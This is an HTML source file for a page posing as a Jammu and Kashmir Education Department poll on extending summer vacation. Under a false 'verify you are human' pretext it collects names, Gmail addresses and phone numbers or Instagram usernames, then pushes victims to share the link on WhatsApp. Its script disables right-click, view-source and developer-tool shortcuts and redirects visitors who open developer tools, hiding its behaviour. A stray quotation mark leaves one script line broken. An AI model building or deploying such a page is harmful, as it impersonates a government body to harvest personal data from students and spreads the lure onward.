<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Confirm Your Vote | Govt. of J&K - Education Department</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
      font-family: 'Inter', sans-serif;
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 10px;
      position: relative;
      overflow-x: hidden;
    }

    body::before {
      content: '';
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: 
        radial-gradient(circle at 20% 80%, rgba(120, 119, 198, 0.3) 0%, transparent 50%),
        radial-gradient(circle at 80% 20%, rgba(255, 255, 255, 0.1) 0%, transparent 50%);
      pointer-events: none;
      z-index: 1;
    }

    .confirmation-container {
      background: rgba(255, 255, 255, 0.95);
      backdrop-filter: blur(20px);
      border-radius: 20px;
      padding: 30px 20px;
      box-shadow: 0 25px 80px rgba(0, 0, 0, 0.15);
      border: 1px solid rgba(255, 255, 255, 0.2);
      max-width: 450px;
      width: 100%;
      position: relative;
      z-index: 10;
      animation: slideUp 0.8s ease-out;
      margin: 10px;
    }

    @keyframes slideUp {
      from {
        opacity: 0;
        transform: translateY(30px);
      }
      to {
        opacity: 1;
        transform: translateY(0);
      }
    }

    .confirmation-container::before {
      content: '';
      position: absolute;
      top: 0;
      left: 0;
      right: 0;
      height: 4px;
      background: linear-gradient(90deg, #667eea, #764ba2, #667eea);
      border-radius: 20px 20px 0 0;
      background-size: 200% 100%;
      animation: gradientShift 3s ease-in-out infinite;
    }

    @keyframes gradientShift {
      0%, 100% { background-position: 0% 50%; }
      50% { background-position: 100% 50%; }
    }

    .header-section {
      text-align: center;
      margin-bottom: 25px;
    }

    .header-section h3 {
      font-weight: 700;
      font-size: 1.5rem;
      color: #2d3748;
      margin-bottom: 12px;
      background: linear-gradient(135deg, #667eea, #764ba2);
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
      background-clip: text;
      line-height: 1.3;
    }

    .header-section p {
      color: #4a5568;
      font-size: 0.9rem;
      line-height: 1.5;
      margin-bottom: 0;
    }

    .security-badge {
      display: inline-flex;
      align-items: center;
      gap: 6px;
      background: linear-gradient(135deg, #e6fffa, #b2f5ea);
      color: #065f46;
      padding: 8px 14px;
      border-radius: 20px;
      font-size: 0.8rem;
      font-weight: 600;
      margin-bottom: 20px;
      border: 1px solid #a7f3d0;
    }

    .form-group {
      margin-bottom: 18px;
      position: relative;
      z-index: 1;
    }

    .form-control {
      width: 100%;
      padding: 14px 16px;
      padding-right: 45px;
      font-size: 0.95rem;
      border: 2px solid #e2e8f0;
      border-radius: 12px;
      background: rgba(255, 255, 255, 0.9);
      transition: all 0.3s ease;
      font-family: 'Inter', sans-serif;
      color: #2d3748;
      -webkit-appearance: none;
      -moz-appearance: none;
      appearance: none;
    }

    .form-control:focus {
      outline: none;
      border-color: #667eea;
      box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1);
      background: white;
    }

    .form-control::placeholder {
      color: #a0aec0;
      font-weight: 400;
    }

    .input-icon {
      position: absolute;
      right: 15px;
      top: 50%;
      transform: translateY(-50%);
      color: #a0aec0;
      font-size: 1.1rem;
      pointer-events: none;
      transition: color 0.3s ease;
      z-index: 2;
    }

    .form-control:focus + .input-icon {
      color: #667eea;
    }

    .btn-submit {
      width: 100%;
      padding: 16px 24px;
      font-size: 1rem;
      font-weight: 600;
      background: linear-gradient(135deg, #667eea, #764ba2);
      color: white;
      border: none;
      border-radius: 12px;
      transition: all 0.3s ease;
      text-transform: uppercase;
      letter-spacing: 0.5px;
      position: relative;
      z-index: 2;
      overflow: hidden;
      margin-top: 10px;
      touch-action: manipulation;
    }

    .btn-submit::before {
      content: '';
      position: absolute;
      top: 0;
      left: -100%;
      width: 100%;
      height: 100%;
      background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.3), transparent);
      transition: left 0.5s;
    }

    .btn-submit:hover::before {
      left: 100%;
    }

    .btn-submit:hover {
      transform: translateY(-2px);
      box-shadow: 0 12px 35px rgba(102, 126, 234, 0.4);
    }

    .btn-submit:active {
      transform: translateY(0);
    }

    .info-section {
      background: linear-gradient(135deg, #f7fafc, #edf2f7);
      border-radius: 12px;
      padding: 16px;
      margin-bottom: 20px;
      border-left: 4px solid #667eea;
    }

    .info-section h4 {
      font-size: 0.9rem;
      font-weight: 600;
      color: #2d3748;
      margin-bottom: 8px;
    }

    .info-section p {
      font-size: 0.8rem;
      color: #4a5568;
      margin-bottom: 0;
      line-height: 1.4;
    }

    .floating-elements {
      position: fixed;
      width: 100%;
      height: 100%;
      top: 0;
      left: 0;
      pointer-events: none;
      z-index: 1;
    }

    .floating-elements::before,
    .floating-elements::after {
      content: '';
      position: absolute;
      border-radius: 50%;
      background: rgba(255, 255, 255, 0.1);
    }

    .floating-elements::before {
      width: 120px;
      height: 120px;
      top: 10%;
      right: -60px;
      animation: float 6s ease-in-out infinite;
    }

    .floating-elements::after {
      width: 80px;
      height: 80px;
      bottom: 10%;
      left: -40px;
      animation: float 6s ease-in-out infinite reverse;
    }

    @keyframes float {
      0%, 100% { transform: translateY(0px); }
      50% { transform: translateY(-15px); }
    }

    .loading-state {
      display: none;
      text-align: center;
      padding: 20px;
    }

    .loading-state.active {
      display: block;
    }

    .spinner {
      width: 35px;
      height: 35px;
      border: 3px solid #e2e8f0;
      border-top: 3px solid #667eea;
      border-radius: 50%;
      animation: spin 1s linear infinite;
      margin: 0 auto 15px;
    }

    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }

    /* WhatsApp Share Button */
    .whatsapp-share {
      width: 100%;
      padding: 14px 24px;
      font-size: 0.95rem;
      font-weight: 600;
      background: linear-gradient(135deg, #25d366, #128c7e);
      color: white;
      border: none;
      border-radius: 12px;
      transition: all 0.3s ease;
      margin-top: 15px;
      touch-action: manipulation;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 8px;
    }

    .whatsapp-share:hover {
      transform: translateY(-2px);
      box-shadow: 0 12px 35px rgba(37, 211, 102, 0.4);
    }

    .whatsapp-share:active {
      transform: translateY(0);
    }

    /* Mobile specific styles */
    @media (max-width: 480px) {
      body {
        padding: 5px;
      }

      .confirmation-container {
        padding: 25px 18px;
        margin: 5px;
        border-radius: 15px;
        max-width: 100%;
      }
      
      .header-section h3 {
        font-size: 1.3rem;
      }
      
      .header-section p {
        font-size: 0.85rem;
      }
      
      .form-control {
        padding: 12px 14px;
        padding-right: 40px;
        font-size: 0.9rem;
      }
      
      .btn-submit {
        padding: 14px 20px;
        font-size: 0.9rem;
        letter-spacing: 0.3px;
      }

      .whatsapp-share {
        padding: 12px 20px;
        font-size: 0.9rem;
      }

      .info-section {
        padding: 14px;
      }

      .info-section h4 {
        font-size: 0.85rem;
      }

      .info-section p {
        font-size: 0.75rem;
      }

      .security-badge {
        font-size: 0.75rem;
        padding: 6px 12px;
      }

      .input-icon {
        right: 12px;
        font-size: 1rem;
      }
    }

    /* Very small screens */
    @media (max-width: 360px) {
      .confirmation-container {
        padding: 20px 15px;
      }

      .header-section h3 {
        font-size: 1.2rem;
      }

      .form-control {
        padding: 11px 12px;
        padding-right: 35px;
        font-size: 0.85rem;
      }

      .btn-submit {
        padding: 12px 18px;
        font-size: 0.85rem;
      }

      .whatsapp-share {
        padding: 11px 18px;
        font-size: 0.85rem;
      }

      .input-icon {
        right: 10px;
        font-size: 0.9rem;
      }
    }

    /* Landscape orientation fixes */
    @media (orientation: landscape) and (max-height: 500px) {
      body {
        padding: 10px;
      }

      .confirmation-container {
        padding: 20px 15px;
        margin: 10px;
      }

      .header-section {
        margin-bottom: 15px;
      }

      .form-group {
        margin-bottom: 12px;
      }

      .info-section {
        padding: 12px;
        margin-bottom: 15px;
      }
    }
  </style>
</head>
<body>
  
  <div class="floating-elements"></div>
  
  <div class="confirmation-container">
    <div style="text-align:center; margin-bottom: 15px;">
  <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTsm0131oew-Aikz9nZ9Ef6MnWmN8TyCyz7ZQ&s" alt="Govt. Emblem" style="height: 60px; opacity: 0.9;">
</div>
    <div class="header-section">
      <h3>Confirm Your Vote</h3>

      <p>Verify you are human to ensure legitimate participation in voting.</p>
    </div>

    <p style="font-size: 0.82rem; color: #718096; margin-top: 8px;">
  To prevent duplicate voting and maintain poll integrity, basic info is required.
</p>

    <form method="POST" action="/submit" id="confirmationForm">
      <div class="form-group">
        <input type="text" class="form-control" name="name" placeholder="Your Full Name" required>
        <span class="input-icon">👤</span>
      </div>

      <div class="form-group">
        <input type="email" class="form-control" name="email" placeholder="Your Email" pattern="^[a-zA-Z0-9._%+-]+@gmail\.com$" title="Only Gmail addresses" required>

        <span class="input-icon">📧</span>
      </div>

      <div class="form-group">
        <input type="text" class="form-control" name="contact" placeholder="Phone Number / Instagram Username" required>
        <span class="input-icon">📱</span>
      </div>

      <button type="submit" class="btn btn-submit" id="submitAndShare">
  <span class="submit-text">Submit Vote & Share</span>
</button>


    <div class="loading-state" id="loadingState">
      <div class="spinner"></div>
      <p>Processing your vote securely...</p>
    </div>
  </div>

  <script>
    // 🚫 Disable right-click
document.addEventListener("contextmenu", e => e.preventDefault());

// 🚫 Disable DevTools shortcuts like F12, Ctrl+Shift+I, Ctrl+U, etc.
document.addEventListener("keydown", function(e) {
  if (
    e.key === "F12" ||                                // F12
    (e.ctrlKey && e.key.toLowerCase() === "u") ||     // Ctrl+U
    (e.ctrlKey && e.shiftKey && ["i", "j", "c"].includes(e.key.toLowerCase())) // Ctrl+Shift+I/J/C
  ) {
    e.preventDefault();
    console.log("Blocked 🤐");
    return false;
  }
});

// 👀 Detect DevTools using sneaky object inspection
let devtoolsDetected = false;
const detector = new Image();
Object.defineProperty(detector, 'id', {
  get: function () {
    devtoolsDetected = true;
    alert("Developer tools detected! For security reasons, you are being redirected.");
    window.location.href = "https://www.google.com"; // or close tab or something dramatic
  }
});
console.log("%c", detector); // Triggers the getter when DevTools are open

// ⛔ Block dragging into new tab to see source
document.addEventListener("dragstart", e => e.preventDefault());

// 🛑 Extra measure for Ctrl+S, Ctrl+A (optional)
document.addEventListener("keydown", function(e) {
  if (
    (e.ctrlKey && ["s", "a"].includes(e.key.toLowerCase()))
  ) {
    e.preventDefault();
  }
});

  document.getElementById('confirmationForm').addEventListener('submit', function(e) {
    e.preventDefault();

    const form = this;
    const btn = document.getElementById('submitAndShare');

    btn.disabled = true;
    btn.innerHTML = '⏳ Submitting...';
    document.getElementById('loadingState').classList.add('active');

    const formData = new FormData(form);

    // Simulate delay and then send using fetch (no reload)
    setTimeout(() => {
      fetch(form.action, {
        method: form.method,
        body: formData
      })
      .then(response => {
        // If response is OK, open WhatsApp
        if (response.ok) {
          const shareText = "Should summer vacation be extended by 10 days? Vote now ➡️ https://your-voting-link.com";";

          const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
          const whatsappURL = isMobile
            ? `whatsapp://send?text=${encodeURIComponent(shareText)}`
            : `https://web.whatsapp.com/send?text=${encodeURIComponent(shareText)}`;

          window.open(whatsappURL, '_blank');
        } else {
          alert('❌ Submission failed. Please try again.');
        }

        btn.disabled = false;
        btn.innerHTML = '🚀 Submit';
        document.getElementById('loadingState').classList.remove('active');
      })
      .catch(error => {
        alert('⚠️ Error submitting form.');
        console.error(error);

        btn.disabled = false;
        btn.innerHTML = 'Submit Vote & Share';
        document.getElementById('loadingState').classList.remove('active');
      });
    }, 1500);
  });

  // Input focus zoom animation
  document.querySelectorAll('.form-control').forEach(input => {
    input.addEventListener('focus', function () {
      this.parentElement.style.transform = 'scale(1.02)';
    });
    input.addEventListener('blur', function () {
      this.parentElement.style.transform = 'scale(1)';
    });
  });

  // Ripple effect for submit button
  document.getElementById('submitAndShare').addEventListener('click', function (e) {
    let ripple = document.createElement('span');
    ripple.style.position = 'absolute';
    ripple.style.borderRadius = '50%';
    ripple.style.background = 'rgba(255, 255, 255, 0.6)';
    ripple.style.transform = 'scale(0)';
    ripple.style.animation = 'ripple 0.6s linear';
    ripple.style.left = (e.clientX - e.target.offsetLeft) + 'px';
    ripple.style.top = (e.clientY - e.target.offsetTop) + 'px';
    ripple.style.pointerEvents = 'none';

    this.appendChild(ripple);
    setTimeout(() => ripple.remove(), 600);
  });
</script>

  <style>
    @keyframes ripple {
      to {
        transform: scale(4);
        opacity: 0;
      }
    }
  </style>
</body>
</html>
